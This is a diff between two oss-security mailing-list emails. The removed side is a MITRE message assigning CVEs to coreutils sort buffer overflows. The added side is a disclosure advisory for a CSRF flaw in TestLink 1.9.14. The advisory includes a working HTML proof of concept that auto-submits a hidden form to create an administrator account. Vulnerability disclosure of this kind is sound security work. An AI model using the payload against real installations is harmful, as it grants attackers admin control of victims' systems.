@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1585" "Tuesday" "19" "May" "2015" "15:36:54" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20150519193654.29FC1B2E0CC@smtpvbsrv1.mitre.org>" "41" "[oss-security] Re: coreutils sort heap overflow" nil nil nil "5" "2015051919:36:54" "[oss-security] Re: coreutils sort heap overflow" (number mark "        cve-assign@m May 19   41/1585  " thread-indent "\"[oss-security] Re: coreutils sort heap overflow\"\n") "<5555403F.3060502@draigBrady.com>" ("<5555403F.3060502@draigBrady.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2772" "Sunday" "8" "November" "2015" "20:01:42" "+0530" "Aravind" "altoarun@gmail.com" "<CALySL4Sh96-M5rgow-9xQ=HUH1JeAsiDi6pcHCT6X2F87b1Fdg@mail.gmail.com>" "94" "[oss-security] CVE Request: TestLink 1.9.14 CSRF Vulnerability" nil nil nil "11" "2015110814:31:42" "[oss-security] CVE Request: TestLink 1.9.14 CSRF Vulnerability" (number mark "U       altoarun@gma Nov  8   94/2772  " thread-indent "\"[oss-security] CVE Request: TestLink 1.9.14 CSRF Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 15408 invoked by uid 550); 19 May 2015 19:37:09 -0000
+Received: (qmail 10068 invoked by uid 550); 8 Nov 2015 15:25:41 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,54 +11,119 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 15364 invoked from network); 19 May 2015 19:37:05 -0000
-In-Reply-To: <5555403F.3060502@draigBrady.com>
-Message-Id: <20150519193654.29FC1B2E0CC@smtpvbsrv1.mitre.org>
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
-Date: Tue, 19 May 2015 15:36:54 -0400 (EDT)
-From: cve-assign@mitre.org
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: coreutils sort heap overflow
-To: P@draigBrady.com
+Received: (qmail 26238 invoked from network); 8 Nov 2015 14:32:13 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:from:date:message-id:subject:to:content-type;
+        bh=gSimEoyKAmVfHSdFJQRxJWQ/SrFVasv5GjCOSacE20s=;
+        b=PcmxZCZQfqLvMW2LzOuPKu1clltUYwBoYlou1CpA7AN7CM58iZ9rY3A1i/EDogB8V6
+         uNGwWW77EUp4mFhZ7zKYjzxcsLhIQSMrGAG9AFYlN44PwIjNsLkgUhQG76UQ/R877/Bs
+         QzDbfuW/R7j7dkWHoxAFyDaqg/zQe0baRpFE3lQE1XRGDhwFwg0vHHdEdFBwh0lzOC7x
+         owMkrIkYg+0ppI8bpjXrrSzWHPYKpTu4wK/AX3J+L/p9On5ekpYUg0XoMZg9zK1DdEXf
+         Xvrkvhf5MR3AxOyh8YliRbAyPb8DKzehzN4D/KoMY5UyvI28mje880qpttlmjDcSlqwl
+         iQ8g==
+X-Received: by 10.28.217.18 with SMTP id q18mr21078958wmg.10.1446993121924;
+ Sun, 08 Nov 2015 06:32:01 -0800 (PST)
+MIME-Version: 1.0
+From: Aravind <altoarun@gmail.com>
+Date: Sun, 8 Nov 2015 20:01:42 +0530
+Message-ID: <CALySL4Sh96-M5rgow-9xQ=HUH1JeAsiDi6pcHCT6X2F87b1Fdg@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset=UTF-8
+Subject: [oss-security] CVE Request: TestLink 1.9.14 CSRF Vulnerability
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Can a CVE be assigned to the following ?
 
-> a heap overflow can be triggered in sort(1) as per:
-> https://bugzilla.suse.com/show_bug.cgi?id=928749
-> https://github.com/pixelb/coreutils/commit/bea5e36cc876ed627bb5e0eca36fdfaa6465e940
-
-> src/sort.c (keycompare_mb) ... The current implementation is character
-> based, so we allocate the worst case size for the conversion buffer,
-> which is MB_CUR_MAX for each input byte.
-
-This appears to be caused by performing a size calculation without
-properly considering the number of bytes occupied by multibyte
-characters. Use CVE-2015-4041.
+Information
+=================================
+Name: CSRF Vulnerability in TestLink 1.9.14
+Affected Software: TestLink
+Affected Versions: 1.9.14 and possibly below
+Vendor Homepage: http://testlink.org/
+Severity: High
+Status: Fixed
 
 
-> https://github.com/pixelb/coreutils/commit/bea5e36cc876ed627bb5e0eca36fdfaa6465e940
+Vulnerability Type:
+=================================
+Cross Site Request Forgery (CSRF)
 
-> There is also a theoretical buffer overflow with data around
-> SIZE_MAX/2.
 
-This appears to be related to the new "SIZE_MAX - lenb - 2 < lena"
-test, which is not specifically associated with use of multibyte
-characters. Use CVE-2015-4042.
+CVE Reference:
+=================================
+Not assigned
 
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.14 (SunOS)
 
-iQEcBAEBAgAGBQJVW5B2AAoJEKllVAevmvmsTCYIALr2h2N45b4ENpHrfUechDFZ
-q2cJqpoDUJ3B4PSendkoh9BeH7fwwVVgSwXJpVtU0vaJOh0SXsioNahkuCpp0eA1
-1v39Lki0eW5/ZDxDzqDcv7m9oLGmI4LjrShqUG11UJhsNQ+6lEJAtz7+VJllW/V4
-NV1ixrRW/pCOpwX1Lp57KO1VSihbb+Iol+gWSTAFaJjn8DqrWrbWBVkVVk1rv3dW
-skkco5SKFUWJBdzPb/PkmEQ71kxXrlsEKBG5wrHHOKjIdQEj9fjnJ/HXo7AoEg1+
-SLq0CV2nVZltIQXvPvxIBvO8a1tM9g+bLoDuCDhyfYG+rCDMkOEBN4nvXyc1+Mw=
-=BJHX
------END PGP SIGNATURE-----
+Technical Details:
+=================================
+Even though the use of CSRF tokens are being implemented in the
+application, they aren't properly
+validated at the server side. This allows malicious requests to be
+generated by the attacker and
+get them processed by the server on behalf of the victim. By
+exploiting the vulnerability,
+the attacker will be able to create user accounts with administrator
+privileges on the application.
+
+
+Exploit Code
+=================================
+
+<html lang="en">
+<head>
+<title>CSRF Exploit to Create New Administrator Account</title>
+</head>
+<body>
+<form action="http://localhost/testlink_1_9_14/lib/usermanagement/usersEdit.php"
+id="formid" method="post">
+<input type="hidden" name="CSRFName" value="" />
+<input type="hidden" name="CSRFToken" value="" />
+<input type="hidden" name="user_id" value="" />
+<input type="hidden" name="user_login" value="" />
+<input type="hidden" name="login" value="new_admin" />
+<input type="hidden" name="firstName" value="new_administrator_fname" />
+<input type="hidden" name="lastName" value="new_administrator_lname" />
+<input type="hidden" name="password" value="new_administrator_password" />
+<input type="hidden" name="emailAddress" value="new_administrator@admin.com" />
+<input type="hidden" name="rights_id" value="8" />
+<input type="hidden" name="locale" value="en_GB" />
+<input type="hidden" name="authentication" value="" />
+<input type="hidden" name="user_is_active" value="on" />
+<input type="hidden" name="doAction" value="doCreate" />
+<input type="hidden" name="do_update" value="Save" />
+</form>
+<script>
+document.getElementById('formid').submit();
+</script>
+</body>
+</html>
+
+
+Exploitation Technique:
+===================================
+Remote
+
+
+Severity Level:
+===================================
+High
+
+
+Advisory Timeline
+===================================
+Sat, 7 Nov 2015 13:14:33 +0530 - First Contact
+Sat, 7 Nov 2015 08:52:14 +0100 - Vendor Response
+Sat, 7 Nov 2015 13:00:54 +0100 - Vendor Fixed
+Sun, 8 Nov 2015 19:03:00 +0530 - Public Disclosure
+
+
+Solution
+====================================
+This vulnerability is fixed in TestLink 1.9.15 (Tauriel)
+Fix: https://github.com/TestLinkOpenSourceTRMS/testlink-code/commit/1cb1f78f1a50f6e6819bcbadeae345eb3213c487
+
+
+Credits & Authors
+====================================
+Aravind C Ajayan, Balagopal N
